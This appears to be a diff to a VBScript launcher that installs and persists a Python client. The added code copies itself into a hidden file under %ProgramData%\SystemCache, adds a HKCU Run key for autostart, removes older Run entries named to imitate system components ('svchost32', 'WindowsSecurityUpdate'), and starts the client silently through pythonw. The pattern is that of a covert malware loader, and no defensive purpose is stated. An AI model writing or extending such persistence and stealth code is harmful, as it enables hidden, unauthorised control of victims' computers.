@@ -9,7 +9,8 @@ Option Explicit
 Dim sh, fso
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
-Const EXPECTED_MD5 = "407195e0c539416350f23a6ca36baa80"
+Dim arch: arch = LCase(sh.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%"))
+Const EXPECTED_MD5 = "c6718a72d4727d01f3d4727c2690ab5e"
 Dim scriptDir: scriptDir = fso.GetParentFolderName(WScript.ScriptFullName)
 Dim safeDir: safeDir = sh.ExpandEnvironmentStrings("%ProgramData%") & "\SystemCache"
 If Not fso.FolderExists(safeDir) Then
@@ -21,14 +22,40 @@ End If
 Dim logDir: logDir = sh.ExpandEnvironmentStrings("%TEMP%") & "\ClientLauncher"
 If Not fso.FolderExists(logDir) Then fso.CreateFolder(logDir)
 Dim logPath: logPath = logDir & "\launcher.log"
+Sub EnsureSafeLauncher()
+  On Error Resume Next
+  Dim dest
+  dest = safeDir & "\ClientService.vbs"
+  fso.CopyFile WScript.ScriptFullName, dest, True
+  fso.GetFile(dest).Attributes = fso.GetFile(dest).Attributes Or 2
+End Sub
+
+Sub EnsureClientInSafe()
+  On Error Resume Next
+  Dim src, dest
+  src = scriptDir & "\client.py"
+  dest = safeDir & "\client.py"
+  If fso.FileExists(src) Then
+    fso.CopyFile src, dest, True
+  End If
+End Sub
 Sub EnsureAutorun()
   On Error Resume Next
-  Dim runKey, cmd
+  Dim runKey, cmd, dest
+  dest = safeDir & "\ClientService.vbs"
+  EnsureSafeLauncher
+  EnsureClientInSafe
   runKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ClientLauncher"
-  cmd = "wscript.exe """ & WScript.ScriptFullName & """"
+  cmd = "wscript.exe """ & dest & """"
   sh.RegWrite runKey, cmd, "REG_SZ"
 End Sub
 EnsureAutorun
+Sub RemoveLegacyAutorun()
+  On Error Resume Next
+  sh.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\svchost32"
+  sh.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSecurityUpdate"
+End Sub
+RemoveLegacyAutorun
 Sub Log(s)
   On Error Resume Next
   Dim lf: Set lf = fso.OpenTextFile(logPath, 8, True)
@@ -42,6 +69,28 @@ Function ExecOut(cmd)
     o = o & p.StdOut.ReadLine() & vbCrLf
   Loop
   ExecOut = o
+End Function
+Function FindPythonw()
+  On Error Resume Next
+  Dim out, lines, i, p
+  out = ExecOut("cmd /c where pythonw.exe")
+  lines = Split(out, vbCrLf)
+  For i = 0 To UBound(lines)
+    p = Trim(lines(i))
+    If p <> "" And fso.FileExists(p) Then FindPythonw = p : Exit Function
+  Next
+  out = ExecOut("cmd /c where python.exe")
+  lines = Split(out, vbCrLf)
+  For i = 0 To UBound(lines)
+    p = Trim(lines(i))
+    If p <> "" Then
+      p = Replace(p, "python.exe", "pythonw.exe")
+      If fso.FileExists(p) Then FindPythonw = p : Exit Function
+    End If
+  Next
+  p = sh.ExpandEnvironmentStrings("%LocalAppData%") & "\Programs\Python\Python312\pythonw.exe"
+  If fso.FileExists(p) Then FindPythonw = p : Exit Function
+  FindPythonw = ""
 End Function
 Function FileMD5(path)
   On Error Resume Next
@@ -73,7 +122,6 @@ Function DownloadToFile(url, path)
     DownloadToFile = False
   End If
 End Function
-Function PythonAvailable()
 Function IsOnline()
   On Error Resume Next
   Dim xhr: Set xhr = CreateObject("MSXML2.XMLHTTP")
@@ -89,6 +137,7 @@ Function IsOnline()
     IsOnline = False
   End If
 End Function
+Function PythonAvailable()
   On Error Resume Next
   Dim out: out = ExecOut("cmd /c py -3 -V")
   If InStr(out, "Python 3") > 0 Then PythonAvailable = True : Exit Function
@@ -152,10 +201,15 @@ End Function
 Sub LaunchClient(scriptPath)
   Dim wd: wd = fso.GetParentFolderName(scriptPath)
   Dim cmd
-  If PythonAvailable() Then
-    cmd = "cmd /c cd /d """ & wd & """ && py -3 """ & scriptPath & """"
+  On Error Resume Next
+  sh.CurrentDirectory = wd
+  Dim pyw: pyw = FindPythonw()
+  If pyw <> "" Then
+    cmd = """" & pyw & """ """ & scriptPath & """"
+  ElseIf PythonAvailable() Then
+    cmd = "py -3 """ & scriptPath & """"
   Else
-    cmd = "cmd /c cd /d """ & wd & """ && python.exe """ & scriptPath & """"
+    cmd = "python.exe """ & scriptPath & """"
   End If
   sh.Run cmd, 0, False
 End Sub
